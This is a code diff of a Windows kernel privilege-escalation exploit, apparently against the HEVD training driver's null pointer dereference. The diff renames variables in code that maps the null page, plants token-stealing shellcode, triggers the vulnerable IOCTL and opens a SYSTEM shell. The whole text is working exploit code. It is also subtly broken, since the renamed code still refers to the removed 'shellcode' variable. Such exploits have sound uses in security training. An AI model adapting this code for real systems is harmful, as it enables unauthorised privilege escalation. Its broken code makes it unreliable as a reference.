@@ -1,6 +1,3 @@
-// HEVD-NullPointerDereference.cpp : Defines the entry point for the console application.
-//
-
 #include "stdafx.h"
 #include <Windows.h>
 #include <string.h>
@@ -8,15 +5,6 @@
 #include <winioctl.h>
 #include <stdint.h>
 #include <malloc.h>
-
-typedef NTSTATUS(WINAPI *_NtAllocateVirtualMemory)(
-	HANDLE ProcessHandle,
-	PVOID *BaseAddress,
-	ULONG_PTR ZeroBits,
-	PSIZE_T AllocationSize,
-	ULONG AllocationType,
-	ULONG Protect
-);
 
 int main()
 {
@@ -33,24 +21,33 @@ int main()
 	}
 	
 	char Buff[20] = "\xDD\xDD\xDD\xDD";
-	DWORD outBytes = 0;
+	DWORD u = 0;
 
-	int baseAddr = 0x1; 
-	int allocationSize = 2048; 
-	int result = 333; 
+	int b = 0x1; 
+	int a = 2048; 
+	int c = 0; 
+	
+	typedef NTSTATUS(WINAPI *pfNtAllocateVirtualMemory)(
+		HANDLE ProcessHandle,
+		PVOID *BaseAddress,
+		ULONG_PTR ZeroBits,
+		PSIZE_T AllocationSize,
+		ULONG AllocationType,
+		ULONG Protect
+	);
 
-	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(
+	pfNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfNtAllocateVirtualMemory)GetProcAddress(
 		GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
 
-	result = NtAllocateVirtualMemory(
+	c = NtAllocateVirtualMemory(
 		GetCurrentProcess(),
-		(PVOID *)&baseAddr,
+		(PVOID *)&b,
 		0,
-		(PSIZE_T)&allocationSize,
+		(PSIZE_T)&a,
 		0x3000,
 		0x40
 	);
-	char shellcode[60] = 
+	char sc[60] = 
 		"\x60" 
 		"\x64\xA1\x24\x01\x00\x00"
 		"\x8B\x40\x50" 
@@ -67,16 +64,16 @@ int main()
 		"\x31\xC0" 
 		"\xC3" 
 		;
-	LPVOID shellcodeAddress = VirtualAlloc(
+	LPVOID lpv = VirtualAlloc(
 		NULL,
 		sizeof(shellcode),
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE
 	);
-	memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
-	LPVOID theShellcodeAddress = &shellcodeAddress;
-	void * returnResult = memcpy((LPVOID)0x00000004, theShellcodeAddress, 4);
-	DeviceIoControl(dev, 0x22202B, &Buff, sizeof(Buff), NULL, 0, &outBytes, (LPOVERLAPPED)NULL);
+	memcpy(lpv, sc, sizeof(sc));
+	LPVOID addr = &lpv;
+	void * bRet = memcpy((LPVOID)0x00000004, addr, 4);
+	DeviceIoControl(dev, 0x22202B, &Buff, sizeof(Buff), NULL, 0, &u, (LPOVERLAPPED)NULL);
 	system("cmd.exe");
 	CloseHandle(dev);
 	system("pause");
